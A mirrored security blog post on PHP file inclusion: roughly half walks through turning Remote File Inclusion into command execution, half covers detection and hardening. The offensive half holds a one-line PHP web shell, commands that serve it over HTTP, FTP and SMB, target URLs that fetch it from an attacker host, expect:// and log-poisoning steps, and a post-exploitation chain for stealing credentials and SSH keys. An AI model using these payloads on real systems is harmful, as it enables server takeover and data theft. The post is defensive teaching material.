# :globe_with_meridians: Ehxb | Inside the Filesystem: The Truth Behind LFI & RFI III

> **Original Source:** [Ehxb | Inside the Filesystem: The Truth Behind LFI & RFI III](https://infosecwriteups.com/ehxb-inside-the-filesystem-the-truth-behind-lfi-rfi-iii-e905aa80d9bf)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Ehxb | Inside the Filesystem: The Truth Behind LFI & RFI III


Part 1 gave you the story. Part 2 gave you the tools. Part 3 is where we step back and look at the whole battlefield.


In this part, you’ll:


- See how Remote File Inclusion (RFI) lets a server reach out to HTTP/FTP/SMB resources and execute whatever it drags back.

- Walk through RFI → RCE flows over HTTP, FTP, and SMB/UNC so you can recognize when a server has effectively become your remote PHP interpreter.

- Compare the most dangerous wrappers — `php://input`, `data://`, `expect://`, `phar://`—and understand exactly how they slot into LFI and RFI chains.

- Stitch everything together into a full end‑to‑end attack chain from one bad `include()` to shells, lateral movement, and persistence.

- Flip into defender mode and turn all of this knowledge into concrete hardening and secure coding patterns.


If Parts 1 and 2 taught you how to break things with LFI, Part 3 teaches you how to spot RFI, read the traces it leaves, and stop these bugs from shipping in the first place.

## 1. Remote File Inclusion: When the Server Reaches Out to You


In Part 1 and 2 we focused mostly on Local File Inclusion (LFI): pulling files from the same filesystem as the web app.


Now let’s revisit Remote File Inclusion (RFI) properly.

### 1.1 LFI vs. RFI Recap


From the original notes:


- LFI — The application includes files from the local file system.

- RFI — The application includes files from remote locations (HTTP, FTP, SMB, etc.).


The mechanism is the same: user input influences a path used by a file function. The difference is just where the file lives.


If the function supports URLs and the configuration allows remote includes, then:


```
include('http://attacker.com/shell.php');
```


is conceptually no different from:


```
include('/var/www/html/about.php');
```


…except that the first one is executing your code, on their server.

### 1.2 When Does LFI Turn Into RFI?


Not every LFI is automatically an RFI. You typically need one of the following:


- A function that accepts remote URLs (`include()`/`require()` with `allow_url_include = On`, or similar behavior in other languages).

- A protocol that the environment treats as “local” but is actually remote:


- UNC paths on Windows: `\\attacker\share\payload.php`.

- SMB shares mounted transparently.


From the original notes, a good first check in PHP is to inspect `php.ini` (via LFI + filters) and look for:


```
allow_url_include = On
```


But configs lie, and not all functions respect URLs. So the most reliable test is empirical.

### 1.3 Empirical Test: Local URL Inclusion


Before firing traffic to your attacker box, test RFI with a local URL to avoid firewall noise:


```
?language=http://127.0.0.1:80/index.php
```


If you see the rendered content of `index.php` appear inside the vulnerable area of your target page, two big facts are now true:


- The vulnerable function supports URL-based includes.

- It’s not just reading the remote resource — it’s executing it (PHP code is run, HTML is rendered).


From there, external RFI is only one step away.

## 2. RFI → RCE with HTTP, FTP, and SMB


Once RFI is confirmed, turning it into RCE is usually straightforward.


We’ll rewrite and structure the flows from the original notes here.

### 2.1 HTTP-Based RFI


This is the classic scenario.


Create a remote PHP web shell on your attacking machine:


```
[!bash!]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```


Host it over HTTP:


```
[!bash!]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> ...
```


Tell the target to include your shell:


```
?language=http://<YOUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```


Watch your HTTP server logs:


```
[!bash!]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> ...
SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```


The remote web server fetched and executed your code. Every subsequent `cmd=` you send is another OS command.

### 2.2 FTP-Based RFI


If outbound HTTP is blocked or inspected, FTP may still be viable.


Start an FTP server using `pyftpdlib`:


```
[!bash!]$ sudo python -m pyftpdlib -p 21
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
```


Include your payload via FTP:


```
?language=ftp://<YOUR_IP>/shell.php&cmd=id
```


If authentication is needed, embed creds in the URL:


```
[!bash!]$ curl \
'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<YOUR_IP>/shell.php&cmd=id'
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


Same story as HTTP, different protocol.

### 2.3 SMB/UNC-Based RFI on Windows


On Windows, SMB shares can be treated by PHP and the OS as if they were local files. This means you can often perform RFI without `allow_url_include`, using UNC paths.


Start an SMB server using Impacket:


```
[!bash!]$ impacket-smbserver -smb2support share $(pwd)
[*] Config file parsed
[*] Callback added for UUID ...
```


Host `shell.php` in the current directory (same trick as before).


Include via UNC path from the target:


```
?language=\\\\<YOUR_IP>\\share\\shell.php&cmd=whoami
```


If outbound SMB is allowed from the target to you (more common on local/LAN scenarios than across the Internet), the server loads and executes `shell.php` from your SMB share.


This is especially dangerous because it sidesteps settings like `allow_url_include`—Windows and SMB treat the path as local.

## 3. Advanced Wrapper Chains: Local, Remote, and Everything In Between


At this point we’ve seen many wrappers across Parts 1 and 2. Let’s put the most critical ones side by side and frame them for both LFI and RFI chains.


From your original diagram, we have:


- `php://input` – Raw POST data as a stream. Dangerous when included directly.

- `data://` – Inline encoded data (often base64). Lets you embed a payload directly in the URL.

- `expect://` – Executes system commands directly when the extension is enabled.

- `phar://` – Archives + object metadata that can trigger dangerous behavior when deserialized or included.

### 3.1 `php://input` – Fileless Code via POST


We saw in Part 2 how LFI on `php://input` can execute code from the request body.


This is equally relevant in RFI-like scenarios when the inclusion point is not restricted to local paths but allows any wrapper.


Key attacker properties:


- Payload never touches disk.

- Can chain with standard HTTP tooling (curl, Burp, intruder, etc.).

- Often missed by basic file-upload checks because it’s not a file at all.


Key defender mitigation:


- Don’t allow user input (especially query parameters) to be used as arbitrary wrapper URIs.

- Use strict allowlists for include targets.

### 3.2 `data://` – Pure Payload in the URL


`data://` is like a “self-contained exploit URL” when combined with `allow_url_include = On`.


You can chain RFI and LFI concepts:


- LFI: Use `data://` as the local resource the app thinks it’s loading.

- RFI: The app might fetch the contents of a `data://` string from its own environment without hitting external servers.


For defenders, this means blocking URLs isn’t enough — you must also ensure wrapper schemes can’t be fed into include functions.

### 3.3 `expect://` – Direct RCE


`expect://` is effectively a ready-made web shell from the moment it’s enabled.


Unlike LFI + log poisoning or upload chains, you don’t need an intermediate writable location.


On a box where `expect` is enabled, a single vulnerable `include($_GET['x']);` can mean:


```
?x=expect://id
```


→ shell.


From the defender perspective, `expect` should almost never be enabled in production.

### 3.4 `phar://` – Archives, Metadata, and Serialization


`phar://` is powerful beyond simple upload inclusion. While we focused on the `phar://.../shell.txt` RCE primitive in Part 2, remember that:


- Phar archives can contain serialized metadata that triggers `unserialize()` gadgets.

- Any function that touches a file’s metadata (even just opening a `phar://` URI) can trigger dangerous code paths in applications using vulnerable deserialization chains.


For this article, the main point is: `phar://` gives attackers yet another route to connect files they control (uploads, remote archives) with include or file APIs on the server.

## 4. Full Exploitation Chains: From `?page=` to Full Compromise


Let’s tie the series together with a realistic, high-level chain that mixes everything.

### 4.1 Example Attack Flow (Ehxb Narrative)


Recon — You notice the app uses URLs like:


```
/index.php?page=about
```


LFI Discovery — You try:


```
?page=../../../../etc/passwd
```


and confirm LFI when you see `root:x:0:0:root:/root:/bin/bash`.Source Disclosure — You pivot to `php://filter`:


```
?page=php://filter/read=convert.base64-encode/resource=index
```


decode the output, and identify how routing and includes are wired.


Config & Log Recon — Using LFI + wordlists, you find:


- `DocumentRoot /var/www/html`.

- `ErrorLog ${APACHE_LOG_DIR}/error.log`.

- `CustomLog ${APACHE_LOG_DIR}/access.log combined`.

- `APACHE_LOG_DIR=/var/log/apache2`.


Log Poisoning → RCE — You craft a malicious User-Agent with a PHP web shell, then include `/var/log/apache2/access.log` via LFI with `&cmd=id`.


## Get Ehxb’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Post-Exploitation — With command execution:


- You dump application configs for DB creds.

- You inspect `/home` for SSH keys with world-readable permissions.

- You check `/etc/cron*` for cron jobs to hijack.


Persistence & Lateral Movement — Using the credentials and keys you find, you move into the DB server, internal admin panels, or other hosts.


Cleanup & Forensics Evasion (if red team) — You might remove your poisoned entries from logs, or at least note the indicators of compromise for the blue team’s learning.


Throughout this, one vulnerable `include()` line plus several misconfigurations were enough for full compromise.

## 5. Detection & Forensics: What RFI/LFI Leave Behind


From a defender’s perspective, you care about:


- How to spot these attacks early.

- What forensic evidence they leave.

### 5.1 Log-Based Indicators


File inclusion attacks tend to leave characteristic traces:


- Repeated attempts with `../` sequences and URL-encoded traversal (`..%2F`).

- Requests containing `php://`, `data://`, `expect://`, `phar://` in parameters.

- Weird-looking values in parameters like `page`, `file`, `lang`, `include`, `view`.

- Requests to unusual paths like `/index.php?language=/etc/passwd`.


Log poisoning itself is detectable by:


- Suspicious `User-Agent`, `Referer`, or other headers containing fragments like `<?php`, `system(`, `base64_decode(`.

- Sudden spikes in 500/200 responses on unusual parameter values.

### 5.2 WAF / IDS Signals


WAFs (like ModSecurity) and network IDS/IPS can be configured to flag:


- Directory traversal patterns (`../`, encoded variants).

- Wrapper schemes in query strings.

- Known exploit patterns (`php://filter`, `data://text/plain;base64,`, `expect://`).


The original notes mention permissive mode as especially useful:


- WAF runs in “alert only,” collecting data on what it *would* have blocked.

- Security teams tune rules to reduce false positives.

- Once tuned, you can flip specific rules to blocking if desired.


Even if you never enable full blocking, permissive mode gives:


- Early warning of attackers probing parameters.

- A rich dataset for threat hunting and retrospective analysis.

### 5.3 Host-Level Traces


If LFI/RFI is used for RCE, host-level signals may include:


- Web server user (`www-data`, `apache`, `nginx`) spawning unexpected processes (`sh`, `bash`, `nc`, `python`).

- Suspicious outbound connections (reverse shells, callbacks) from web servers.

- New or modified files in the webroot (dropped web shells).


Combining app logs, WAF logs, and host telemetry provides your best shot at catching this class of attacks early.

## 6. Hardening Strategies: Making File Inclusion Boring Again


Now we flip fully into defense.


The goal isn’t to never call `include()` or `render()` again—it’s to design the app so that user input can’t weaponize those calls, and to contain damage if a bug emerges.

### 6.1 Core Principle: Don’t Let User Input Choose Files


The most effective defense from the original notes:

>

“The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs.”


Instead of:


```
include($_GET['page']);
```


use an allowlist mapping:


```
$allowed_pages = [
'home' => 'home.php',
'about' => 'about.php',
'contact' => 'contact.php',
];
$page = $_GET['page'] ?? 'home';
if (!array_key_exists($page, $allowed_pages)) {
$page = 'home';
}
include($allowed_pages[$page]);
```


You can implement the mapping via:


- Static arrays.

- Database tables.

- JSON config files.

- Switch/case constructs for small apps.


The invariant: file APIs only ever see server-chosen paths, never raw user data.

### 6.2 Preventing Directory Traversal


If you absolutely must accept something like a filename from the user (e.g., for a log viewer or document manager):


- Use built-in helpers like `basename()` to strip directories.

- Reject or normalize path separators.

- Optionally, map logical names to filenames rather than accepting raw paths.


From the notes, a simple traversal-stripper:


```
while (substr_count($input, '../', 0)) {
$input = str_replace('../', '', $input);
}
```


This recursively removes all `../` segments.


On its own, this is not enough (wrappers, absolute paths, and encoding tricks still exist), but combined with allowlists and normalized paths it significantly reduces attack surface.

### 6.3 Web Server and PHP Configuration Hardening


Configuration can drastically reduce the blast radius of an inclusion bug.


Key measures from the original material:


- Disable remote URL inclusion:

- `allow_url_fopen = Off`

- `allow_url_include = Off`

- Restrict filesystem access:

- `open_basedir = /var/www` (or an even more restricted directory).

- Disable dangerous modules unless absolutely necessary:

- PHP `expect` extension.

- Apache `mod_userdir` (can expose unintended file paths).


Better yet, run the web app inside a container or sandbox:


- Minimal filesystem exposed.

- Limited capabilities and privileges.

- Clear separation between web tier, DB tier, and others.


These measures mean that even if someone finds an inclusion bug:


- They can’t read arbitrary system files.

- They can’t pull remote scripts via URLs.

- They have a much harder time turning it into RCE.

### 6.4 WAFs and Defense-in-Depth


WAFs like ModSecurity are not silver bullets, but they buy time:


- Catch commodity scanners and low-effort attacks.

- Provide telemetry about more sophisticated attempts.


From the notes:


- Permissive mode is useful in tuning.

- Hardened apps still need continuous log monitoring and zero-day response.


Defense-in-depth mindset:


- Application layer: no user-controlled paths into file APIs.

- Runtime layer: restricted wrappers, `open_basedir`, disabled dangerous modules.

- Infrastructure layer: containers, separate users, minimal privileges.

- Perimeter layer: WAF/IDS signatures for traversal and wrappers.

- Monitoring layer: alerting on anomalies and suspicious patterns.

## 7. Developer Checklists, Do’s & Don’ts


To make this more actionable for devs, here’s a condensed checklist distilled from the original prevention sections.

### 7.1 Do’s


- Do use a fixed mapping of logical view names → physical templates.

- Do centralize all includes/partial rendering in a small, reviewable set of functions.

- Do enable `open_basedir` or equivalent mechanisms to confine file access.

- Do ensure logs containing user data are not readable by the webserver user when they’ll never need to be.

- Do treat wrappers like `php://`, `data://`, `phar://` as dangerous inputs, not harmless strings.

- Do run periodic scans (fuzzers, SAST, targeted security reviews) specifically looking for file inclusion patterns.

### 7.2 Don’ts


- Don’t pass user input directly into `include`, `require`, `res.render`, `<jsp:include>`, or `@Html.Partial`.

- Don’t implement your own homegrown path sanitization if the framework provides something better.

- Don’t leave legacy features or unused parameters wired to includes.

- Don’t enable `allow_url_include` or `expect` unless you have a very strong reason (and a sandbox around it).

- Don’t assume “it’s only reading `/etc/passwd`, nothing sensitive there” — treat any inclusion bug as a likely stepping stone to RCE.

>

Part 3 — What You Should Walk Away With


RFI is LFI’s louder cousin: once URL-based includes are in play, a single line of code can turn your webserver into a remote execution engine for attacker‑hosted scripts.


HTTP, FTP, and SMB/UNC aren’t just transport protocols here — they’re delivery channels for payloads if the app is willing to treat them as include targets.


Wrappers like `php://input`, `data://`, `expect://`, and `phar://` blur the line between “local file,” “remote resource,” and “raw data,” which is why they’re so often at the center of advanced chains.


Real compromises aren’t about one bug; they’re about the sequence: a parameter → LFI/RFI → config and log discovery → poisoning or upload inclusion → RCE → lateral movement and persistence.


Good detection hinges on correlating weird parameter values, traversal and wrapper patterns, and suspicious headers in logs with host‑level signs like odd child processes or unexpected outbound traffic.


Solid hardening is multi-layered: keep user input away from file APIs, confine the filesystem with `open_basedir` or similar, disable remote includes and risky extensions, and put WAF/monitoring in front of everything.


As a developer, your golden rule is simple: never let untrusted data decide which file is read or executed. If you enforce that, everything else becomes much easier to secure.


This wraps up the series. From here on, every time you see a `?page=`, `?file=`, or `?template=` parameter, you should instinctively evaluate it like an attacker—and then fix it like someone who’s already seen where that road leads.

---

*Originally published on [Medium](https://infosecwriteups.com/ehxb-inside-the-filesystem-the-truth-behind-lfi-rfi-iii-e905aa80d9bf). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
